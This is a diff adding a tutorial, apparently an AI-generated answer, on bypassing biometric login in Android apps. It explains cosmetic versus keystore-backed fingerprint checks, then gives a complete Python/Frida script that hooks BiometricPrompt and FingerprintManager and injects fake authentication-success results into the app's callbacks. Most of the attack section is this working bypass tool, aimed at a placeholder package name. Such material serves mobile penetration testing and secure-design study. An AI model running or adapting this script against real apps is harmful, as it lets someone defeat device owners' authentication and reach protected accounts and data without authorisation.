@@ -1,1 +1,124 @@
+Bypassing biometric authentication (Touch ID / Face ID / Fingerprint) in Android applications focuses on subverting how the app handles authentication callbacks. In mobile application security, biometric authentication can be implemented in two ways: Insecure (Cosmetic) or Secure (Cryptographic).
+If an application implements biometric checks without linking them to cryptographic keys inside the hardware-backed keystore, you can completely bypass the authentication screen at runtime using dynamic instrumentation.
 
+📂 The Two Forms of Biometric Architectures
+
+Before writing a bypass, you must understand how the app treats a successful fingerprint match:
+1. Cosmetic Authentication (Vulnerable): The app displays a fingerprint prompt. If you touch the sensor, a simple callback method (onAuthenticationSucceeded) triggers. It returns a generic boolean flag or executes an intent to transition to the main dashboard. This implementation is highly vulnerable to runtime hooking.
+2. Cryptographic Authentication (Secure): A successful fingerprint match unlocks a private key housed securely inside the device's Android Keystore System. This key is then used to decrypt a critical session token. If you bypass the UI callback here, the application will crash or fail later because it never received the decrypted cryptographic token needed to communicate with the server.
+
+🛠️ Step-by-Step Reversing Methodology
+
+
+Step 1: Search for Biometric Callbacks
+
+Decompile your target APK using JADX-GUI or extract it via Apktool. Open a global codebase search and target the official Android biometric architecture signatures:
+• BiometricPrompt
+• BiometricPrompt$AuthenticationCallback
+• FingerprintManager (Legacy Android API, still common in older apps)
+
+Step 2: Analyze the Success Trigger
+
+Look closely at the onAuthenticationSucceeded method implementation inside the decompiled code. If you see it defined like this:
+java
+@Override
+public void onAuthenticationSucceeded(BiometricPrompt.AuthenticationResult result) {
+    super.onAuthenticationSucceeded(result);
+    // Cosmetic check flag! No crypto object used.
+    this.this$0.navigateToDashboard(); 
+}
+Use code with caution.
+Because the method takes an AuthenticationResult object but doesn't pull a CryptoObject out of it to decrypt an auth payload, you can force this method to execute on command, skipping physical biometric validation entirely.
+
+🐍 Automation & Runtime Bypass with Python & Frida
+
+The script below combines Python with Frida to hook the native Android biometric architecture. At runtime, the script intercepts the app's structural validation pipeline and manually forces a call straight to onAuthenticationSucceeded, tricking the application into believing a valid biometric scan occurred.
+python
+import sys
+import frida
+
+# JavaScript payload to manipulate Android's Biometric system framework in memory
+FRIDA_BIOMETRIC_BYPASS = """
+Java.perform(function () {
+    console.log("[*] Initializing Biometric (TouchID/FaceID) bypass routine...");
+
+    // Target the modern Android BiometricPrompt architecture
+    var BiometricPrompt = Java.use("android.hardware.biometrics.BiometricPrompt");
+    var BiometricPromptAuthResult = Java.use("android.hardware.biometrics.BiometricPrompt$AuthenticationResult");
+    
+    // Target the fingerprint manager framework callback architecture
+    var FingerprintManager = Java.use("android.hardware.fingerprint.FingerprintManager");
+    var FingerprintAuthResult = Java.use("android.hardware.fingerprint.FingerprintManager$AuthenticationResult");
+
+    // 1. Hooking BiometricPrompt.authenticate calls
+    if (BiometricPrompt) {
+        BiometricPrompt.authenticate.overload(
+            'android.os.CancellationSignal', 
+            'java.util.concurrent.Executor', 
+            'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback'
+        ).implementation = function (cancellationSignal, executor, callback) {
+            console.log("[!] Intercepted BiometricPrompt.authenticate() invocation. Simulating validation...");
+            
+            // Instantiating a fake success authentication result object
+            var fakeResult = BiometricPromptAuthResult.$new(null, null, 0);
+            
+            // Instantly route execution stream directly into the app's success callback method
+            callback.onAuthenticationSucceeded(fakeResult);
+            console.log("[+] Fake Biometric success signal injected successfully via BiometricPrompt.");
+        };
+    }
+
+    // 2. Hooking the legacy FingerprintManager.authenticate calls for backward compatibility
+    if (FingerprintManager) {
+        FingerprintManager.authenticate.overload(
+            'android.hardware.fingerprint.FingerprintManager$CryptoObject', 
+            'android.os.CancellationSignal', 
+            'int', 
+            'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback', 
+            'android.os.Handler'
+        ).implementation = function (crypto, cancel, flags, callback, handler) {
+            console.log("[!] Intercepted legacy FingerprintManager.authenticate(). Simulating validation...");
+            
+            // Instantiate a fake fingerprint authentication success wrapper
+            var fakeFingerprintResult = FingerprintAuthResult.$new(crypto, null, 0, false);
+            
+            // Fire the success loop callback programmatically
+            callback.onAuthenticationSucceeded(fakeFingerprintResult);
+            console.log("[+] Fake Biometric success signal injected successfully via FingerprintManager.");
+        };
+    }
+});
+"""
+
+def on_message(message, data):
+    """Handles runtime print updates coming out of the Frida injection container."""
+    if message['type'] == 'send':
+        print(f"[Frida Log] {message['payload']}")
+    elif message['type'] == 'error':
+        print(f"[-] Frida Script Error: {message['description']}")
+
+if __name__ == "__main__":
+    # Supply your target application's unique package ID
+    TARGET_PACKAGE = "com.example.vulnerableapp"
+
+    try:
+        print(f"[*] Attaching to device and spawning application process: '{TARGET_PACKAGE}'")
+        device = frida.get_usb_device()
+        pid = device.spawn([TARGET_PACKAGE])
+        session = device.attach(pid)
+        
+        script = session.create_script(FRIDA_BIOMETRIC_BYPASS)
+        script.on('message', on_message)
+        script.load()
+        
+        # Resume app execution context with active hooks in memory
+        device.resume(pid)
+        print("[+] Bypass framework deployed. Trigger the biometric login screen in the app to fire the payload.")
+        print("[*] Press Ctrl+C to terminate the active session.")
+        sys.stdin.read()
+        
+    except frida.ServerNotRunningError:
+        print("[-] Error: Frida server is not running on the device. Execute 'frida-server' via shell first.")
+    except Exception as e:
+        print(f"[-] Operational failure encountered: {e}")
+Use code with caution.
